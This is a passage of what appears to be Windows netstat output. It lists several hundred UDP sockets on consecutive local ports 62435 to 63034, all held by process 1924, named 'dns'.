  UDP        [::]                                        62435         *:*                            1924              dns
  UDP        [::]                                        62436         *:*                            1924              dns
  UDP        [::]                                        62437         *:*                            1924              dns
  UDP        [::]                                        62438         *:*                            1924              dns
  UDP        [::]                                        62439         *:*                            1924              dns
  UDP        [::]                                        62440         *:*                            1924              dns
  UDP        [::]                                        62441         *:*                            1924              dns
  UDP        [::]                                        62442         *:*                            1924              dns
  UDP        [::]                                        62443         *:*                            1924              dns
  UDP        [::]                                        62444         *:*                            1924              dns
  UDP        [::]                                        62445         *:*                            1924              dns
  UDP        [::]                                        62446         *:*                            1924              dns
  UDP        [::]                                        62447         *:*                            1924              dns
  UDP        [::]                                        62448         *:*                            1924              dns
  UDP        [::]                                        62449         *:*                            1924              dns
  UDP        [::]                                        62450         *:*                            1924              dns
  UDP        [::]                                        62451         *:*                            1924              dns
  UDP        [::]                                        62452         *:*                            1924              dns
  UDP        [::]                                        62453         *:*                            1924              dns
  UDP        [::]                                        62454         *:*                            1924              dns
  UDP        [::]                                        62455         *:*                            1924              dns
  UDP        [::]                                        62456         *:*                            1924              dns
  UDP        [::]                                        62457         *:*                            1924              dns
  UDP        [::]                                        62458         *:*                            1924              dns
  UDP        [::]                                        62459         *:*                            1924              dns
  UDP        [::]                                        62460         *:*                            1924              dns
  UDP        [::]                                        62461         *:*                            1924              dns
  UDP        [::]                                        62462         *:*                            1924              dns
  UDP        [::]                                        62463         *:*                            1924              dns
  UDP        [::]                                        62464         *:*                            1924              dns
  UDP        [::]                                        62465         *:*                            1924              dns
  UDP        [::]                                        62466         *:*                            1924              dns
  UDP        [::]                                        62467         *:*                            1924              dns
  UDP        [::]                                        62468         *:*                            1924              dns
  UDP        [::]                                        62469         *:*                            1924              dns
  UDP        [::]                                        62470         *:*                            1924              dns
  UDP        [::]                                        62471         *:*                            1924              dns
  UDP        [::]                                        62472         *:*                            1924              dns
  UDP        [::]                                        62473         *:*                            1924              dns
  UDP        [::]                                        62474         *:*                            1924              dns
  UDP        [::]                                        62475         *:*                            1924              dns
  UDP        [::]                                        62476         *:*                            1924              dns
  UDP        [::]                                        62477         *:*                            1924              dns
  UDP        [::]                                        62478         *:*                            1924              dns
  UDP        [::]                                        62479         *:*                            1924              dns
  UDP        [::]                                        62480         *:*                            1924              dns
  UDP        [::]                                        62481         *:*                            1924              dns
  UDP        [::]                                        62482         *:*                            1924              dns
  UDP        [::]                                        62483         *:*                            1924              dns
  UDP        [::]                                        62484         *:*                            1924              dns
  UDP        [::]                                        62485         *:*                            1924              dns
  UDP        [::]                                        62486         *:*                            1924              dns
  UDP        [::]                                        62487         *:*                            1924              dns
  UDP        [::]                                        62488         *:*                            1924              dns
  UDP        [::]                                        62489         *:*                            1924              dns
  UDP        [::]                                        62490         *:*                            1924              dns
  UDP        [::]                                        62491         *:*                            1924              dns
  UDP        [::]                                        62492         *:*                            1924              dns
  UDP        [::]                                        62493         *:*                            1924              dns
  UDP        [::]                                        62494         *:*                            1924              dns
  UDP        [::]                                        62495         *:*                            1924              dns
  UDP        [::]                                        62496         *:*                            1924              dns
  UDP        [::]                                        62497         *:*                            1924              dns
  UDP        [::]                                        62498         *:*                            1924              dns
  UDP        [::]                                        62499         *:*                            1924              dns
  UDP        [::]                                        62500         *:*                            1924              dns
  UDP        [::]                                        62501         *:*                            1924              dns
  UDP        [::]                                        62502         *:*                            1924              dns
  UDP        [::]                                        62503         *:*                            1924              dns
  UDP        [::]                                        62504         *:*                            1924              dns
  UDP        [::]                                        62505         *:*                            1924              dns
  UDP        [::]                                        62506         *:*                            1924              dns
  UDP        [::]                                        62507         *:*                            1924              dns
  UDP        [::]                                        62508         *:*                            1924              dns
  UDP        [::]                                        62509         *:*                            1924              dns
  UDP        [::]                                        62510         *:*                            1924              dns
  UDP        [::]                                        62511         *:*                            1924              dns
  UDP        [::]                                        62512         *:*                            1924              dns
  UDP        [::]                                        62513         *:*                            1924              dns
  UDP        [::]                                        62514         *:*                            1924              dns
  UDP        [::]                                        62515         *:*                            1924              dns
  UDP        [::]                                        62516         *:*                            1924              dns
  UDP        [::]                                        62517         *:*                            1924              dns
  UDP        [::]                                        62518         *:*                            1924              dns
  UDP        [::]                                        62519         *:*                            1924              dns
  UDP        [::]                                        62520         *:*                            1924              dns
  UDP        [::]                                        62521         *:*                            1924              dns
  UDP        [::]                                        62522         *:*                            1924              dns
  UDP        [::]                                        62523         *:*                            1924              dns
  UDP        [::]                                        62524         *:*                            1924              dns
  UDP        [::]                                        62525         *:*                            1924              dns
  UDP        [::]                                        62526         *:*                            1924              dns
  UDP        [::]                                        62527         *:*                            1924              dns
  UDP        [::]                                        62528         *:*                            1924              dns
  UDP        [::]                                        62529         *:*                            1924              dns
  UDP        [::]                                        62530         *:*                            1924              dns
  UDP        [::]                                        62531         *:*                            1924              dns
  UDP        [::]                                        62532         *:*                            1924              dns
  UDP        [::]                                        62533         *:*                            1924              dns
  UDP        [::]                                        62534         *:*                            1924              dns
  UDP        [::]                                        62535         *:*                            1924              dns
  UDP        [::]                                        62536         *:*                            1924              dns
  UDP        [::]                                        62537         *:*                            1924              dns
  UDP        [::]                                        62538         *:*                            1924              dns
  UDP        [::]                                        62539         *:*                            1924              dns
  UDP        [::]                                        62540         *:*                            1924              dns
  UDP        [::]                                        62541         *:*                            1924              dns
  UDP        [::]                                        62542         *:*                            1924              dns
  UDP        [::]                                        62543         *:*                            1924              dns
  UDP        [::]                                        62544         *:*                            1924              dns
  UDP        [::]                                        62545         *:*                            1924              dns
  UDP        [::]                                        62546         *:*                            1924              dns
  UDP        [::]                                        62547         *:*                            1924              dns
  UDP        [::]                                        62548         *:*                            1924              dns
  UDP        [::]                                        62549         *:*                            1924              dns
  UDP        [::]                                        62550         *:*                            1924              dns
  UDP        [::]                                        62551         *:*                            1924              dns
  UDP        [::]                                        62552         *:*                            1924              dns
  UDP        [::]                                        62553         *:*                            1924              dns
  UDP        [::]                                        62554         *:*                            1924              dns
  UDP        [::]                                        62555         *:*                            1924              dns
  UDP        [::]                                        62556         *:*                            1924              dns
  UDP        [::]                                        62557         *:*                            1924              dns
  UDP        [::]                                        62558         *:*                            1924              dns
  UDP        [::]                                        62559         *:*                            1924              dns
  UDP        [::]                                        62560         *:*                            1924              dns
  UDP        [::]                                        62561         *:*                            1924              dns
  UDP        [::]                                        62562         *:*                            1924              dns
  UDP        [::]                                        62563         *:*                            1924              dns
  UDP        [::]                                        62564         *:*                            1924              dns
  UDP        [::]                                        62565         *:*                            1924              dns
  UDP        [::]                                        62566         *:*                            1924              dns
  UDP        [::]                                        62567         *:*                            1924              dns
  UDP        [::]                                        62568         *:*                            1924              dns
  UDP        [::]                                        62569         *:*                            1924              dns
  UDP        [::]                                        62570         *:*                            1924              dns
  UDP        [::]                                        62571         *:*                            1924              dns
  UDP        [::]                                        62572         *:*                            1924              dns
  UDP        [::]                                        62573         *:*                            1924              dns
  UDP        [::]                                        62574         *:*                            1924              dns
  UDP        [::]                                        62575         *:*                            1924              dns
  UDP        [::]                                        62576         *:*                            1924              dns
  UDP        [::]                                        62577         *:*                            1924              dns
  UDP        [::]                                        62578         *:*                            1924              dns
  UDP        [::]                                        62579         *:*                            1924              dns
  UDP        [::]                                        62580         *:*                            1924              dns
  UDP        [::]                                        62581         *:*                            1924              dns
  UDP        [::]                                        62582         *:*                            1924              dns
  UDP        [::]                                        62583         *:*                            1924              dns
  UDP        [::]                                        62584         *:*                            1924              dns
  UDP        [::]                                        62585         *:*                            1924              dns
  UDP        [::]                                        62586         *:*                            1924              dns
  UDP        [::]                                        62587         *:*                            1924              dns
  UDP        [::]                                        62588         *:*                            1924              dns
  UDP        [::]                                        62589         *:*                            1924              dns
  UDP        [::]                                        62590         *:*                            1924              dns
  UDP        [::]                                        62591         *:*                            1924              dns
  UDP        [::]                                        62592         *:*                            1924              dns
  UDP        [::]                                        62593         *:*                            1924              dns
  UDP        [::]                                        62594         *:*                            1924              dns
  UDP        [::]                                        62595         *:*                            1924              dns
  UDP        [::]                                        62596         *:*                            1924              dns
  UDP        [::]                                        62597         *:*                            1924              dns
  UDP        [::]                                        62598         *:*                            1924              dns
  UDP        [::]                                        62599         *:*                            1924              dns
  UDP        [::]                                        62600         *:*                            1924              dns
  UDP        [::]                                        62601         *:*                            1924              dns
  UDP        [::]                                        62602         *:*                            1924              dns
  UDP        [::]                                        62603         *:*                            1924              dns
  UDP        [::]                                        62604         *:*                            1924              dns
  UDP        [::]                                        62605         *:*                            1924              dns
  UDP        [::]                                        62606         *:*                            1924              dns
  UDP        [::]                                        62607         *:*                            1924              dns
  UDP        [::]                                        62608         *:*                            1924              dns
  UDP        [::]                                        62609         *:*                            1924              dns
  UDP        [::]                                        62610         *:*                            1924              dns
  UDP        [::]                                        62611         *:*                            1924              dns
  UDP        [::]                                        62612         *:*                            1924              dns
  UDP        [::]                                        62613         *:*                            1924              dns
  UDP        [::]                                        62614         *:*                            1924              dns
  UDP        [::]                                        62615         *:*                            1924              dns
  UDP        [::]                                        62616         *:*                            1924              dns
  UDP        [::]                                        62617         *:*                            1924              dns
  UDP        [::]                                        62618         *:*                            1924              dns
  UDP        [::]                                        62619         *:*                            1924              dns
  UDP        [::]                                        62620         *:*                            1924              dns
  UDP        [::]                                        62621         *:*                            1924              dns
  UDP        [::]                                        62622         *:*                            1924              dns
  UDP        [::]                                        62623         *:*                            1924              dns
  UDP        [::]                                        62624         *:*                            1924              dns
  UDP        [::]                                        62625         *:*                            1924              dns
  UDP        [::]                                        62626         *:*                            1924              dns
  UDP        [::]                                        62627         *:*                            1924              dns
  UDP        [::]                                        62628         *:*                            1924              dns
  UDP        [::]                                        62629         *:*                            1924              dns
  UDP        [::]                                        62630         *:*                            1924              dns
  UDP        [::]                                        62631         *:*                            1924              dns
  UDP        [::]                                        62632         *:*                            1924              dns
  UDP        [::]                                        62633         *:*                            1924              dns
  UDP        [::]                                        62634         *:*                            1924              dns
  UDP        [::]                                        62635         *:*                            1924              dns
  UDP        [::]                                        62636         *:*                            1924              dns
  UDP        [::]                                        62637         *:*                            1924              dns
  UDP        [::]                                        62638         *:*                            1924              dns
  UDP        [::]                                        62639         *:*                            1924              dns
  UDP        [::]                                        62640         *:*                            1924              dns
  UDP        [::]                                        62641         *:*                            1924              dns
  UDP        [::]                                        62642         *:*                            1924              dns
  UDP        [::]                                        62643         *:*                            1924              dns
  UDP        [::]                                        62644         *:*                            1924              dns
  UDP        [::]                                        62645         *:*                            1924              dns
  UDP        [::]                                        62646         *:*                            1924              dns
  UDP        [::]                                        62647         *:*                            1924              dns
  UDP        [::]                                        62648         *:*                            1924              dns
  UDP        [::]                                        62649         *:*                            1924              dns
  UDP        [::]                                        62650         *:*                            1924              dns
  UDP        [::]                                        62651         *:*                            1924              dns
  UDP        [::]                                        62652         *:*                            1924              dns
  UDP        [::]                                        62653         *:*                            1924              dns
  UDP        [::]                                        62654         *:*                            1924              dns
  UDP        [::]                                        62655         *:*                            1924              dns
  UDP        [::]                                        62656         *:*                            1924              dns
  UDP        [::]                                        62657         *:*                            1924              dns
  UDP        [::]                                        62658         *:*                            1924              dns
  UDP        [::]                                        62659         *:*                            1924              dns
  UDP        [::]                                        62660         *:*                            1924              dns
  UDP        [::]                                        62661         *:*                            1924              dns
  UDP        [::]                                        62662         *:*                            1924              dns
  UDP        [::]                                        62663         *:*                            1924              dns
  UDP        [::]                                        62664         *:*                            1924              dns
  UDP        [::]                                        62665         *:*                            1924              dns
  UDP        [::]                                        62666         *:*                            1924              dns
  UDP        [::]                                        62667         *:*                            1924              dns
  UDP        [::]                                        62668         *:*                            1924              dns
  UDP        [::]                                        62669         *:*                            1924              dns
  UDP        [::]                                        62670         *:*                            1924              dns
  UDP        [::]                                        62671         *:*                            1924              dns
  UDP        [::]                                        62672         *:*                            1924              dns
  UDP        [::]                                        62673         *:*                            1924              dns
  UDP        [::]                                        62674         *:*                            1924              dns
  UDP        [::]                                        62675         *:*                            1924              dns
  UDP        [::]                                        62676         *:*                            1924              dns
  UDP        [::]                                        62677         *:*                            1924              dns
  UDP        [::]                                        62678         *:*                            1924              dns
  UDP        [::]                                        62679         *:*                            1924              dns
  UDP        [::]                                        62680         *:*                            1924              dns
  UDP        [::]                                        62681         *:*                            1924              dns
  UDP        [::]                                        62682         *:*                            1924              dns
  UDP        [::]                                        62683         *:*                            1924              dns
  UDP        [::]                                        62684         *:*                            1924              dns
  UDP        [::]                                        62685         *:*                            1924              dns
  UDP        [::]                                        62686         *:*                            1924              dns
  UDP        [::]                                        62687         *:*                            1924              dns
  UDP        [::]                                        62688         *:*                            1924              dns
  UDP        [::]                                        62689         *:*                            1924              dns
  UDP        [::]                                        62690         *:*                            1924              dns
  UDP        [::]                                        62691         *:*                            1924              dns
  UDP        [::]                                        62692         *:*                            1924              dns
  UDP        [::]                                        62693         *:*                            1924              dns
  UDP        [::]                                        62694         *:*                            1924              dns
  UDP        [::]                                        62695         *:*                            1924              dns
  UDP        [::]                                        62696         *:*                            1924              dns
  UDP        [::]                                        62697         *:*                            1924              dns
  UDP        [::]                                        62698         *:*                            1924              dns
  UDP        [::]                                        62699         *:*                            1924              dns
  UDP        [::]                                        62700         *:*                            1924              dns
  UDP        [::]                                        62701         *:*                            1924              dns
  UDP        [::]                                        62702         *:*                            1924              dns
  UDP        [::]                                        62703         *:*                            1924              dns
  UDP        [::]                                        62704         *:*                            1924              dns
  UDP        [::]                                        62705         *:*                            1924              dns
  UDP        [::]                                        62706         *:*                            1924              dns
  UDP        [::]                                        62707         *:*                            1924              dns
  UDP        [::]                                        62708         *:*                            1924              dns
  UDP        [::]                                        62709         *:*                            1924              dns
  UDP        [::]                                        62710         *:*                            1924              dns
  UDP        [::]                                        62711         *:*                            1924              dns
  UDP        [::]                                        62712         *:*                            1924              dns
  UDP        [::]                                        62713         *:*                            1924              dns
  UDP        [::]                                        62714         *:*                            1924              dns
  UDP        [::]                                        62715         *:*                            1924              dns
  UDP        [::]                                        62716         *:*                            1924              dns
  UDP        [::]                                        62717         *:*                            1924              dns
  UDP        [::]                                        62718         *:*                            1924              dns
  UDP        [::]                                        62719         *:*                            1924              dns
  UDP        [::]                                        62720         *:*                            1924              dns
  UDP        [::]                                        62721         *:*                            1924              dns
  UDP        [::]                                        62722         *:*                            1924              dns
  UDP        [::]                                        62723         *:*                            1924              dns
  UDP        [::]                                        62724         *:*                            1924              dns
  UDP        [::]                                        62725         *:*                            1924              dns
  UDP        [::]                                        62726         *:*                            1924              dns
  UDP        [::]                                        62727         *:*                            1924              dns
  UDP        [::]                                        62728         *:*                            1924              dns
  UDP        [::]                                        62729         *:*                            1924              dns
  UDP        [::]                                        62730         *:*                            1924              dns
  UDP        [::]                                        62731         *:*                            1924              dns
  UDP        [::]                                        62732         *:*                            1924              dns
  UDP        [::]                                        62733         *:*                            1924              dns
  UDP        [::]                                        62734         *:*                            1924              dns
  UDP        [::]                                        62735         *:*                            1924              dns
  UDP        [::]                                        62736         *:*                            1924              dns
  UDP        [::]                                        62737         *:*                            1924              dns
  UDP        [::]                                        62738         *:*                            1924              dns
  UDP        [::]                                        62739         *:*                            1924              dns
  UDP        [::]                                        62740         *:*                            1924              dns
  UDP        [::]                                        62741         *:*                            1924              dns
  UDP        [::]                                        62742         *:*                            1924              dns
  UDP        [::]                                        62743         *:*                            1924              dns
  UDP        [::]                                        62744         *:*                            1924              dns
  UDP        [::]                                        62745         *:*                            1924              dns
  UDP        [::]                                        62746         *:*                            1924              dns
  UDP        [::]                                        62747         *:*                            1924              dns
  UDP        [::]                                        62748         *:*                            1924              dns
  UDP        [::]                                        62749         *:*                            1924              dns
  UDP        [::]                                        62750         *:*                            1924              dns
  UDP        [::]                                        62751         *:*                            1924              dns
  UDP        [::]                                        62752         *:*                            1924              dns
  UDP        [::]                                        62753         *:*                            1924              dns
  UDP        [::]                                        62754         *:*                            1924              dns
  UDP        [::]                                        62755         *:*                            1924              dns
  UDP        [::]                                        62756         *:*                            1924              dns
  UDP        [::]                                        62757         *:*                            1924              dns
  UDP        [::]                                        62758         *:*                            1924              dns
  UDP        [::]                                        62759         *:*                            1924              dns
  UDP        [::]                                        62760         *:*                            1924              dns
  UDP        [::]                                        62761         *:*                            1924              dns
  UDP        [::]                                        62762         *:*                            1924              dns
  UDP        [::]                                        62763         *:*                            1924              dns
  UDP        [::]                                        62764         *:*                            1924              dns
  UDP        [::]                                        62765         *:*                            1924              dns
  UDP        [::]                                        62766         *:*                            1924              dns
  UDP        [::]                                        62767         *:*                            1924              dns
  UDP        [::]                                        62768         *:*                            1924              dns
  UDP        [::]                                        62769         *:*                            1924              dns
  UDP        [::]                                        62770         *:*                            1924              dns
  UDP        [::]                                        62771         *:*                            1924              dns
  UDP        [::]                                        62772         *:*                            1924              dns
  UDP        [::]                                        62773         *:*                            1924              dns
  UDP        [::]                                        62774         *:*                            1924              dns
  UDP        [::]                                        62775         *:*                            1924              dns
  UDP        [::]                                        62776         *:*                            1924              dns
  UDP        [::]                                        62777         *:*                            1924              dns
  UDP        [::]                                        62778         *:*                            1924              dns
  UDP        [::]                                        62779         *:*                            1924              dns
  UDP        [::]                                        62780         *:*                            1924              dns
  UDP        [::]                                        62781         *:*                            1924              dns
  UDP        [::]                                        62782         *:*                            1924              dns
  UDP        [::]                                        62783         *:*                            1924              dns
  UDP        [::]                                        62784         *:*                            1924              dns
  UDP        [::]                                        62785         *:*                            1924              dns
  UDP        [::]                                        62786         *:*                            1924              dns
  UDP        [::]                                        62787         *:*                            1924              dns
  UDP        [::]                                        62788         *:*                            1924              dns
  UDP        [::]                                        62789         *:*                            1924              dns
  UDP        [::]                                        62790         *:*                            1924              dns
  UDP        [::]                                        62791         *:*                            1924              dns
  UDP        [::]                                        62792         *:*                            1924              dns
  UDP        [::]                                        62793         *:*                            1924              dns
  UDP        [::]                                        62794         *:*                            1924              dns
  UDP        [::]                                        62795         *:*                            1924              dns
  UDP        [::]                                        62796         *:*                            1924              dns
  UDP        [::]                                        62797         *:*                            1924              dns
  UDP        [::]                                        62798         *:*                            1924              dns
  UDP        [::]                                        62799         *:*                            1924              dns
  UDP        [::]                                        62800         *:*                            1924              dns
  UDP        [::]                                        62801         *:*                            1924              dns
  UDP        [::]                                        62802         *:*                            1924              dns
  UDP        [::]                                        62803         *:*                            1924              dns
  UDP        [::]                                        62804         *:*                            1924              dns
  UDP        [::]                                        62805         *:*                            1924              dns
  UDP        [::]                                        62806         *:*                            1924              dns
  UDP        [::]                                        62807         *:*                            1924              dns
  UDP        [::]                                        62808         *:*                            1924              dns
  UDP        [::]                                        62809         *:*                            1924              dns
  UDP        [::]                                        62810         *:*                            1924              dns
  UDP        [::]                                        62811         *:*                            1924              dns
  UDP        [::]                                        62812         *:*                            1924              dns
  UDP        [::]                                        62813         *:*                            1924              dns
  UDP        [::]                                        62814         *:*                            1924              dns
  UDP        [::]                                        62815         *:*                            1924              dns
  UDP        [::]                                        62816         *:*                            1924              dns
  UDP        [::]                                        62817         *:*                            1924              dns
  UDP        [::]                                        62818         *:*                            1924              dns
  UDP        [::]                                        62819         *:*                            1924              dns
  UDP        [::]                                        62820         *:*                            1924              dns
  UDP        [::]                                        62821         *:*                            1924              dns
  UDP        [::]                                        62822         *:*                            1924              dns
  UDP        [::]                                        62823         *:*                            1924              dns
  UDP        [::]                                        62824         *:*                            1924              dns
  UDP        [::]                                        62825         *:*                            1924              dns
  UDP        [::]                                        62826         *:*                            1924              dns
  UDP        [::]                                        62827         *:*                            1924              dns
  UDP        [::]                                        62828         *:*                            1924              dns
  UDP        [::]                                        62829         *:*                            1924              dns
  UDP        [::]                                        62830         *:*                            1924              dns
  UDP        [::]                                        62831         *:*                            1924              dns
  UDP        [::]                                        62832         *:*                            1924              dns
  UDP        [::]                                        62833         *:*                            1924              dns
  UDP        [::]                                        62834         *:*                            1924              dns
  UDP        [::]                                        62835         *:*                            1924              dns
  UDP        [::]                                        62836         *:*                            1924              dns
  UDP        [::]                                        62837         *:*                            1924              dns
  UDP        [::]                                        62838         *:*                            1924              dns
  UDP        [::]                                        62839         *:*                            1924              dns
  UDP        [::]                                        62840         *:*                            1924              dns
  UDP        [::]                                        62841         *:*                            1924              dns
  UDP        [::]                                        62842         *:*                            1924              dns
  UDP        [::]                                        62843         *:*                            1924              dns
  UDP        [::]                                        62844         *:*                            1924              dns
  UDP        [::]                                        62845         *:*                            1924              dns
  UDP        [::]                                        62846         *:*                            1924              dns
  UDP        [::]                                        62847         *:*                            1924              dns
  UDP        [::]                                        62848         *:*                            1924              dns
  UDP        [::]                                        62849         *:*                            1924              dns
  UDP        [::]                                        62850         *:*                            1924              dns
  UDP        [::]                                        62851         *:*                            1924              dns
  UDP        [::]                                        62852         *:*                            1924              dns
  UDP        [::]                                        62853         *:*                            1924              dns
  UDP        [::]                                        62854         *:*                            1924              dns
  UDP        [::]                                        62855         *:*                            1924              dns
  UDP        [::]                                        62856         *:*                            1924              dns
  UDP        [::]                                        62857         *:*                            1924              dns
  UDP        [::]                                        62858         *:*                            1924              dns
  UDP        [::]                                        62859         *:*                            1924              dns
  UDP        [::]                                        62860         *:*                            1924              dns
  UDP        [::]                                        62861         *:*                            1924              dns
  UDP        [::]                                        62862         *:*                            1924              dns
  UDP        [::]                                        62863         *:*                            1924              dns
  UDP        [::]                                        62864         *:*                            1924              dns
  UDP        [::]                                        62865         *:*                            1924              dns
  UDP        [::]                                        62866         *:*                            1924              dns
  UDP        [::]                                        62867         *:*                            1924              dns
  UDP        [::]                                        62868         *:*                            1924              dns
  UDP        [::]                                        62869         *:*                            1924              dns
  UDP        [::]                                        62870         *:*                            1924              dns
  UDP        [::]                                        62871         *:*                            1924              dns
  UDP        [::]                                        62872         *:*                            1924              dns
  UDP        [::]                                        62873         *:*                            1924              dns
  UDP        [::]                                        62874         *:*                            1924              dns
  UDP        [::]                                        62875         *:*                            1924              dns
  UDP        [::]                                        62876         *:*                            1924              dns
  UDP        [::]                                        62877         *:*                            1924              dns
  UDP        [::]                                        62878         *:*                            1924              dns
  UDP        [::]                                        62879         *:*                            1924              dns
  UDP        [::]                                        62880         *:*                            1924              dns
  UDP        [::]                                        62881         *:*                            1924              dns
  UDP        [::]                                        62882         *:*                            1924              dns
  UDP        [::]                                        62883         *:*                            1924              dns
  UDP        [::]                                        62884         *:*                            1924              dns
  UDP        [::]                                        62885         *:*                            1924              dns
  UDP        [::]                                        62886         *:*                            1924              dns
  UDP        [::]                                        62887         *:*                            1924              dns
  UDP        [::]                                        62888         *:*                            1924              dns
  UDP        [::]                                        62889         *:*                            1924              dns
  UDP        [::]                                        62890         *:*                            1924              dns
  UDP        [::]                                        62891         *:*                            1924              dns
  UDP        [::]                                        62892         *:*                            1924              dns
  UDP        [::]                                        62893         *:*                            1924              dns
  UDP        [::]                                        62894         *:*                            1924              dns
  UDP        [::]                                        62895         *:*                            1924              dns
  UDP        [::]                                        62896         *:*                            1924              dns
  UDP        [::]                                        62897         *:*                            1924              dns
  UDP        [::]                                        62898         *:*                            1924              dns
  UDP        [::]                                        62899         *:*                            1924              dns
  UDP        [::]                                        62900         *:*                            1924              dns
  UDP        [::]                                        62901         *:*                            1924              dns
  UDP        [::]                                        62902         *:*                            1924              dns
  UDP        [::]                                        62903         *:*                            1924              dns
  UDP        [::]                                        62904         *:*                            1924              dns
  UDP        [::]                                        62905         *:*                            1924              dns
  UDP        [::]                                        62906         *:*                            1924              dns
  UDP        [::]                                        62907         *:*                            1924              dns
  UDP        [::]                                        62908         *:*                            1924              dns
  UDP        [::]                                        62909         *:*                            1924              dns
  UDP        [::]                                        62910         *:*                            1924              dns
  UDP        [::]                                        62911         *:*                            1924              dns
  UDP        [::]                                        62912         *:*                            1924              dns
  UDP        [::]                                        62913         *:*                            1924              dns
  UDP        [::]                                        62914         *:*                            1924              dns
  UDP        [::]                                        62915         *:*                            1924              dns
  UDP        [::]                                        62916         *:*                            1924              dns
  UDP        [::]                                        62917         *:*                            1924              dns
  UDP        [::]                                        62918         *:*                            1924              dns
  UDP        [::]                                        62919         *:*                            1924              dns
  UDP        [::]                                        62920         *:*                            1924              dns
  UDP        [::]                                        62921         *:*                            1924              dns
  UDP        [::]                                        62922         *:*                            1924              dns
  UDP        [::]                                        62923         *:*                            1924              dns
  UDP        [::]                                        62924         *:*                            1924              dns
  UDP        [::]                                        62925         *:*                            1924              dns
  UDP        [::]                                        62926         *:*                            1924              dns
  UDP        [::]                                        62927         *:*                            1924              dns
  UDP        [::]                                        62928         *:*                            1924              dns
  UDP        [::]                                        62929         *:*                            1924              dns
  UDP        [::]                                        62930         *:*                            1924              dns
  UDP        [::]                                        62931         *:*                            1924              dns
  UDP        [::]                                        62932         *:*                            1924              dns
  UDP        [::]                                        62933         *:*                            1924              dns
  UDP        [::]                                        62934         *:*                            1924              dns
  UDP        [::]                                        62935         *:*                            1924              dns
  UDP        [::]                                        62936         *:*                            1924              dns
  UDP        [::]                                        62937         *:*                            1924              dns
  UDP        [::]                                        62938         *:*                            1924              dns
  UDP        [::]                                        62939         *:*                            1924              dns
  UDP        [::]                                        62940         *:*                            1924              dns
  UDP        [::]                                        62941         *:*                            1924              dns
  UDP        [::]                                        62942         *:*                            1924              dns
  UDP        [::]                                        62943         *:*                            1924              dns
  UDP        [::]                                        62944         *:*                            1924              dns
  UDP        [::]                                        62945         *:*                            1924              dns
  UDP        [::]                                        62946         *:*                            1924              dns
  UDP        [::]                                        62947         *:*                            1924              dns
  UDP        [::]                                        62948         *:*                            1924              dns
  UDP        [::]                                        62949         *:*                            1924              dns
  UDP        [::]                                        62950         *:*                            1924              dns
  UDP        [::]                                        62951         *:*                            1924              dns
  UDP        [::]                                        62952         *:*                            1924              dns
  UDP        [::]                                        62953         *:*                            1924              dns
  UDP        [::]                                        62954         *:*                            1924              dns
  UDP        [::]                                        62955         *:*                            1924              dns
  UDP        [::]                                        62956         *:*                            1924              dns
  UDP        [::]                                        62957         *:*                            1924              dns
  UDP        [::]                                        62958         *:*                            1924              dns
  UDP        [::]                                        62959         *:*                            1924              dns
  UDP        [::]                                        62960         *:*                            1924              dns
  UDP        [::]                                        62961         *:*                            1924              dns
  UDP        [::]                                        62962         *:*                            1924              dns
  UDP        [::]                                        62963         *:*                            1924              dns
  UDP        [::]                                        62964         *:*                            1924              dns
  UDP        [::]                                        62965         *:*                            1924              dns
  UDP        [::]                                        62966         *:*                            1924              dns
  UDP        [::]                                        62967         *:*                            1924              dns
  UDP        [::]                                        62968         *:*                            1924              dns
  UDP        [::]                                        62969         *:*                            1924              dns
  UDP        [::]                                        62970         *:*                            1924              dns
  UDP        [::]                                        62971         *:*                            1924              dns
  UDP        [::]                                        62972         *:*                            1924              dns
  UDP        [::]                                        62973         *:*                            1924              dns
  UDP        [::]                                        62974         *:*                            1924              dns
  UDP        [::]                                        62975         *:*                            1924              dns
  UDP        [::]                                        62976         *:*                            1924              dns
  UDP        [::]                                        62977         *:*                            1924              dns
  UDP        [::]                                        62978         *:*                            1924              dns
  UDP        [::]                                        62979         *:*                            1924              dns
  UDP        [::]                                        62980         *:*                            1924              dns
  UDP        [::]                                        62981         *:*                            1924              dns
  UDP        [::]                                        62982         *:*                            1924              dns
  UDP        [::]                                        62983         *:*                            1924              dns
  UDP        [::]                                        62984         *:*                            1924              dns
  UDP        [::]                                        62985         *:*                            1924              dns
  UDP        [::]                                        62986         *:*                            1924              dns
  UDP        [::]                                        62987         *:*                            1924              dns
  UDP        [::]                                        62988         *:*                            1924              dns
  UDP        [::]                                        62989         *:*                            1924              dns
  UDP        [::]                                        62990         *:*                            1924              dns
  UDP        [::]                                        62991         *:*                            1924              dns
  UDP        [::]                                        62992         *:*                            1924              dns
  UDP        [::]                                        62993         *:*                            1924              dns
  UDP        [::]                                        62994         *:*                            1924              dns
  UDP        [::]                                        62995         *:*                            1924              dns
  UDP        [::]                                        62996         *:*                            1924              dns
  UDP        [::]                                        62997         *:*                            1924              dns
  UDP        [::]                                        62998         *:*                            1924              dns
  UDP        [::]                                        62999         *:*                            1924              dns
  UDP        [::]                                        63000         *:*                            1924              dns
  UDP        [::]                                        63001         *:*                            1924              dns
  UDP        [::]                                        63002         *:*                            1924              dns
  UDP        [::]                                        63003         *:*                            1924              dns
  UDP        [::]                                        63004         *:*                            1924              dns
  UDP        [::]                                        63005         *:*                            1924              dns
  UDP        [::]                                        63006         *:*                            1924              dns
  UDP        [::]                                        63007         *:*                            1924              dns
  UDP        [::]                                        63008         *:*                            1924              dns
  UDP        [::]                                        63009         *:*                            1924              dns
  UDP        [::]                                        63010         *:*                            1924              dns
  UDP        [::]                                        63011         *:*                            1924              dns
  UDP        [::]                                        63012         *:*                            1924              dns
  UDP        [::]                                        63013         *:*                            1924              dns
  UDP        [::]                                        63014         *:*                            1924              dns
  UDP        [::]                                        63015         *:*                            1924              dns
  UDP        [::]                                        63016         *:*                            1924              dns
  UDP        [::]                                        63017         *:*                            1924              dns
  UDP        [::]                                        63018         *:*                            1924              dns
  UDP        [::]                                        63019         *:*                            1924              dns
  UDP        [::]                                        63020         *:*                            1924              dns
  UDP        [::]                                        63021         *:*                            1924              dns
  UDP        [::]                                        63022         *:*                            1924              dns
  UDP        [::]                                        63023         *:*                            1924              dns
  UDP        [::]                                        63024         *:*                            1924              dns
  UDP        [::]                                        63025         *:*                            1924              dns
  UDP        [::]                                        63026         *:*                            1924              dns
  UDP        [::]                                        63027         *:*                            1924              dns
  UDP        [::]                                        63028         *:*                            1924              dns
  UDP        [::]                                        63029         *:*                            1924              dns
  UDP        [::]                                        63030         *:*                            1924              dns
  UDP        [::]                                        63031         *:*                            1924              dns
  UDP        [::]                                        63032         *:*                            1924              dns
  UDP        [::]                                        63033         *:*                            1924              dns
  UDP        [::]                                        63034         *:*                            1924              dns
